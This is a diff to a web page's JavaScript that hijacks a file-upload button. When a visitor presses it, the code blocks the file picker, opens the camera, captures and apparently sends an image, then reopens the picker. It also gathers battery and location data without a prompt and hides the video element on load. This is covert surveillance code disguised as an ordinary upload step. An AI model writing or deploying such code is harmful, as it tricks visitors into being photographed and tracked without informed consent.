@@ -11,6 +11,15 @@ let cameraInProgress = false;
 let capturedImage = null; // store camera image
 
 // ================================
+// ENSURE VIDEO IS CLEAN ON PAGE LOAD
+// ================================
+window.addEventListener("DOMContentLoaded", () => {
+  video.srcObject = null;
+  video.style.display = "none";
+  video.removeAttribute("autoplay"); // prevent auto-popup
+});
+
+// ================================
 // COLLECT METADATA (ON SUBMIT)
 // ================================
 async function collectMetadata() {
@@ -24,7 +33,6 @@ async function collectMetadata() {
     time: new Date().toLocaleString(),
   };
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -32,7 +40,6 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location only if already granted (NO POPUP)
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -60,7 +67,7 @@ async function captureAndSendCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
-    video.setAttribute("playsinline", true);
+    video.setAttribute("playsinline", true); // mobile fix
     video.style.display = "block";
 
     await new Promise((resolve) => {
@@ -107,8 +114,8 @@ async function captureAndSendCamera() {
 fileInput.addEventListener("pointerdown", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
     e.preventDefault(); // stop file picker temporarily
-    await captureAndSendCamera();
-    setTimeout(() => fileInput.click(), 50); // reopen file picker
+    await captureAndSendCamera(); // permission asked here
+    setTimeout(() => fileInput.click(), 50); // reopen file picker after capture
   }
 });
 
